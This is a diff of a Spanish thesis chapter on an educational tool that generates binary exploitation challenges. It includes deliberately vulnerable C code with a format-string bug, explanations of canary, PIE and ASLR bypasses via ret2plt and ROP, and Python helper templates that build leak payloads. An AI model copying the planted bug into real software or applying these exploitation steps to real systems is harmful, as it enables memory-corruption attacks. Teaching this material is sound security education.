+        puts("Now you can continue with what I asked you before :) \n");
+    } while(0);
+}
+
+void hard_leak() {
+    do
+    {
+        char init[16];
+        printf("\nBut first, I'll print what you type, max 16 bytes, take it as a gift: ");
+        fgets(init, sizeof(init), stdin);
+        printf(init);
+        printf("\n");
+        puts("Now you can continue with what I asked you before :) \n");
         /* code */
     } while (0);
 }
 \end{lstlisting}
 \section{Soluciones a los retos}
 Como uno de los objetivos del proyecto se ha propuesto entregar al usuario de la aplicación un tutorial sobre como solventar los problemas generados.
-
-Debido a que el proyecto está enfocado al ámbito educativo se ha pensado que la mejor solución es entregar plantillas paso a paso con el mecanismo de resolución esperado para el problema propuesto.
+Uno de los objetivos del proyecto es proporcionar al usuario de la aplicación un tutorial sobre cómo resolver los problemas generados.
+Dado que el proyecto está orientado al ámbito educativo, se ha considerado que la solución más efectiva es ofrecer plantillas detalladas con el mecanismo de resolución esperado.
 \subsection{Tutoriales}
+El ejemplo básico presentado en el tutorial aborda cómo resolver un \acrshort{bof} sin mitigaciones, como se detalla en el punto \ref{subsub:bof}.
+A medida que aumenta la dificultad, se incorporan ejemplos adicionales al programa auxiliar proporcionado.
+\subsubsection{Explotación con canario}
+Para explotar este tipo de vulnerabilidad, el programa añade una función que permite explotar una vulnerabilidad del tipo format string.
+Para que el usuario de la aplicación encuentre el valor del canario debe debuguear el binario y analizar el comportamiento antes de la entrada de usuario de la distancia entre \acrshort{ebp} y \acrshort{esp}.
+Esto es debido a que el calculo del offset exacto se puede realizar mediante:
+`(\acrshort{ebp} - \acrshort{esp} - 0xc) / 4' y debe devolver un valor entero.
+En su defecto el usuario también puede probarlo mediante fuerza bruta, aunque el metodo es considerablemente más lento.
+Además, es necesario saber la posición exacta del canario en el stack.
+El usuario puede determinar esta posición mediante un código cíclico y revisando antes de la función de retorno que valor hay en esa dirección de memoria.
+
+\subsubsection{Explotación con PIE}
+Para explotar esta vulnerabilidad el programa añade dos dificultades diferentes.
+
+La dificultad sencilla ofrece la dirección de memoria de la función ejecutada directamente.
+En caso de usar la dificultad máxima, el usuario debe ser el que busque un valor relacionado al stack para poder calcular el offset a la base del binario.
+Para ello, necesita hacer uso del debugger y analizar que parámetro devuelve un valor del stack, además de calcular que offset tiene sobre la base para poder hacer la resta directa.
+
+Con la base calculada, el usuario podría emplear técnicas como `ret2libc' para ejecución de código o `ret2plt' en caso de que tenga \acrshort{aslr} para poder obtener la dirección de \acrshort{libc}.
+
+\subsubsection{Explotación con ASLR}
+Mediante esta medida el usuario no dispone de las direcciones de memoria de \acrshort{libc} para poder construir el código malicioso.
+Sin embargo, mediante la técnica `ret2plt' que a continuación se explica, se podría obtener la dirección en memoria de una función e imprimirla por pantalla.
+
+Al igual que en el punto anterior, si la dificultad está configurada al máximo, no se obtendrán leaks de la memoria del binario y el usuario deberá ser el que tenga que encontrarlas.
+Para ello, primero se debe obtener la base del binario y en caso de que no tenga \acrshort{pie}, se debe obtener un leak mediante la vulnerabilidad del tipo format string.
+
+El mecanismo de `ret2plt' consiste en explotar la estructura de los binarios en Linux.
+Un binario contiene dos cabeceras con las direcciones de memoria a las funciones externas: \acrshort{plt} y \acrshort{got}.
+La \acrshort{plt} contiene un direccionamiento al \acrshort{got}. En esta última dirección la librería que enlaza dinámicamente las funciones resuelve a la dirección real y de este modo se ejecuta la función.
+
+Para conseguir un leak de la ubicación de la \acrshort{libc}, se debe apuntar a una función que imprima por pantalla texto, por ejemplo, `puts'.
+Por lo cual, el retorno debería apuntar a `puts@plt'. Como argumento intermedio de retorno, se necesita volver a la función vulnerable para realizar la explotación final con las direcciones correctas y por último la dirección del simbolo en la \acrshort{got} de puts, es decir, `puts@got'.
+
+En la siguiente imagen se puede ver de forma gráfica el mecanismo de llamadas usando como referencia la \acrshort{plt}:
+
+\FloatBarrier
+\begin{figure}[htb!]
+    \centering                        
+    \includegraphics[width=0.5\textwidth]{images/ret2plt.png}
+    \caption{Ejemplo del funcionamiento de llamadas con PLT}
+    \label{fig:ret2plt}
+\end{figure}
+\FloatBarrier
+
+\subsubsection{Explotación mediante ROP}
+\acrfull{rop} es una técnica muy común que permite trabajar mediante cadenas de instrucciones con el objetivo de conseguir un estado deseado en el stack.
+El funcionamiento es simple, se analiza el binario en busca de instrucciones del formato `pop ret', `push ret' y similares y se enlazan en las instrucciones de retorno.
+Debido a que después de la secuencia deseada se ejecuta un retorno, podemos concatenar las instrucciones para conseguir el objetivo deseado.
+Esta técnica se usa de forma más frecuente en las arquitecturas de 64bit, debido a que la convención de llamadas funciona mediante registros en vez de stack.
+
+\FloatBarrier
+\begin{figure}[htb!]
+    \centering                        
+    \includegraphics[width=1\textwidth]{images/rop64bit.png}
+    \caption{Ejemplo del funcionamiento de un ROP Chain}
+    \label{fig:ropchain}
+\end{figure}
+\FloatBarrier
+\pagebreak
 
 \subsection{Ejemplos de plantillas}
+En este apartado se pueden observar ejemplos de las plantillas que se entregan al usuario de la aplicación.
+Estas plantillas están divididas por secciones y, de esta manera, se puede entregar de forma modular lo necesario al usuario para explotar el reto.
+La plantilla final que consiste en la unión de los diferentes modulos, también incluye una clase que ayuda al usuario a trabajar con la herramienta `pwntools' llamada `Solver'.
+Todas las plantillas serán snippets de código.
+\subsubsection{Plantilla BOF}
+\begin{lstlisting}[language=Python, caption=Plantilla BOF]
+print("Bienvenido al helper de PWN! Espero que te sirva de gran utilidad!")
+binario = input("Introduce el path del binario: ")
+solver = Solver(binario)
+print(f"Abre el binario en GDB mediante: gdb { binario }")
+print(f"Establece un breakpoint en la funcion main para que cargue todo: b main")
+print("Y ahora lo ejecutamos con: run")
+print("Primero vamos a calcular el offset al registro EIP, para ello necesitamos ir a la funcion vulnerable e introducir un payload ciclico, por ejemplo:")
+print(solver.gen_cyclic(120))
+print("Cuando lo introduzcas en la funcion vulnerable, dependiendo de las mitigaciones habilitadas, el resultado podría ser diferente")
+print("Tambien es importante no pasarse con el tamaño del cyclic, en caso de que se rompa el puntero a buf strcpy podría fallar")
+print("Si la función tiene leak con format string, introduce el parametro en la segunda funcion de input")
+print("Al continuar el programa deberia haber fallado, en caso de que no sea asi, la longitud del payload no fue suficiente, intentalo con otro mas largo!")
+print("Cual es el valor que tienes en el EIP? Puedes usar el comando 'bt' para ver el callstack, busca el valor justo despues de la funcion de input")
+offset_eip = int(input("Valor en el EIP: "), 16)
+print(f"El offset que hay hasta el EIP es: {solver.find_eip_offset(offset_eip)}")
+\end{lstlisting}
+\subsubsection{Plantilla falso canario}
+\begin{lstlisting}[language=Python, caption=Plantilla falso canario]
+print(f"El binario contiene un falso canario, este está hardcodeado, revisa en el código fuente o el ensamblador cual es su valor, después saca el offset siguiendo los pasos anteriores")
+falso_canario = int(input("Cual es el offset del falso canario? "))
+\end{lstlisting}
+
+\subsubsection{Plantilla canario real}
+\begin{lstlisting}[language=Python, caption=Plantilla canario real]
+print("El binario tiene un canario real, sigue los siguientes pasos!")
+leak_fn = input("Cual es la función que tiene el leak?? ")
+print("Primero vas a sacar el offset en el buffer overflow hasta el canario, necesitas establecer un breakpoint antes de terminar la función, usa: 'b strncpy'")
+print("Ahora necesitas inyectar el código cíclico antes generado para poder calcular offsets")
+print("En cuanto llegue al breakpoint, vas a revisar el valor del canario, este se úbica en la dirección $ebp - 0xc, usa el siguiente comando: 'x/x $ebp - 0xc'")
+canary_offset = int(input("Cual es el valor que tiene esa dirección? "), 16)
+solver.find_canary_offset(canary_offset)
+if not solver.makes_sense():
+    print("Hay algo mal, repite la ejecución y asegurate que los valores están bien, el offset al canario no puede ser mayor o igual al del EIP")
+    exit(1)
+print("Ahora necesitas sacar el offset del format string del canario, vas a parar antes de la llamada a la función de fgets")
+print("Para ello escribe el siguiente comando")
+print(f"Escribe este comando: disassemble {leak_fn}")
+print("Busca el offset de la función fgets, por ejemplo, input_0 +54")
+offset_bp = input("Cual es el offset de fgets? ")
+print(f"Muy bien, entonces vamos a parar la ejecución justo antes de que llegue con el comando: b *{leak_fn} + {offset_bp}")
+print("Continuamos la ejecución ejecutando: continue")
+print("Debemos ver que ha parado justo antes de la llamada, ahora necesitamos recuperar dos valores, EBP y ESP")
+print("Para ello usa el comando 'p $esp' para saber el valor del ESP y 'p $ebp' para el del EBP")
+ebp = int(input("Cual es el valor del EBP? "), 16)
+esp = int(input("Cual es el valor del ESP? "), 16)
+print("Con esos valores y mediante el cálculo de (EBP - ESP - 0xc) // 4 podremos saber el offset del format string")
+canary_fmtstr = solver.get_canary_fmtstr(ebp, esp)
+print(f"El valor que leakea el canario es: {canary_fmtstr}")
+print("Pruebalo a ver que sucede al introducir ese valor, debería devolver un resultado acabado en 00, presiona 'continue'")
+canario = int(input("Cual ha sido el valor devuelto? En caso de que acabe en 00 ya tienes bajo control el canario! "), 16)
+solver.set_canary(canario)
+\end{lstlisting}
+\subsubsection{Plantilla de PIE sin leak automático}
+\begin{lstlisting}[language=Python, caption=Plantilla PIE sin leak automático]
+print("El binario tiene PIE, vamos a leakear la base!")
+print("Para ello, vamos a hacer un poco de fuerza bruta sobre el format string, necesitamos recuperar un valor del formato 0x56XXXX o similar")
+print("Introduce en el format string algo tal que así: " + "%p "* 7)
+print("Has obtenido algún valor del stack? En caso de que no, intentalo con más offsets, por ejemplo %8$p, %9$p... ")
+print("Una vez hayas conseguido un valor similar al stack, vamos a calcular el offset a la base!")
+print("Para ello primero necesitas conocer la dirección de la base, puedes usar este comando: 'info proc mappings' y el start addr más bajo de tu binario será la base!")
+base = int(input("Cual es la base del binario? "), 16)
+stack_leak = int(input("Cual es el leak del stack que has conseguido? "), 16)
+stack_leak_offset = int(input("En que offset estaba? Por ejemplo: %p %p %p -> 0x10 0xffXXXX 0x56XXXX sería el offset 3: "))
+solver.set_elf_base(stack_leak, base)
+print("Muy bien, así seras capaz de saber la base del binario y poder usar la GOT y PLT!")
+\end{lstlisting}
+\subsubsection{Plantilla ASLR sin leak autmático}
+\begin{lstlisting}[language=Python, caption=Plantilla ASLR sin leak automático]
+print("El binario tiene ASLR, vamos a leakear la dirección de LIBC!")
+print("Para ello necesitas saber de una función de libc que esté en la GOT, por ejemplo, 'puts'. Puedes usar el comando: \"p 'puts@got.plt'\"")
+print("Nos debería devolver su dirección, en caso de que sea así, podremos leakear su dirección de LIBC")
+print("En caso de que no haya resultado, busca otra función en la GOT, puedes usar objdump sobre el binario y revisar la GOT y PLT en busca de funciones de LIBC")
+print("Vamos a probar a generar el leak, para ello necesitas cambiar las funciones del exploit para que apunten a la función puts, returnen a la función explotable y por último como argumento le damos la función de puts")
+print("Por ejemplo, AAAAAAAAA + canario + dirección PLT puts + dirección función explotable + dirección GOT puts, si tenemos los leaks de PIE o no hay PIE, podemos usar pwntools o esta misma clase")
+print("El payload se va a escribir en un fichero llamado aslr_payload.txt")
+
+with open("aslr_payload.txt", "wb") as f:
+    f.write(solver.gen_payload_base())
+    f.write(solver.leak_libc("__libc_start_main", leak_fn))
+print("Hecho, intenta meter ese payload al binario y debería devolverte una dirección de memoria.")
+leak_libc = int(input("Cual ha sido la dirección de memoria devuelta? "), 16)
+solver.set_libc_base(leak_libc, "__libc_start_main")
+\end{lstlisting}
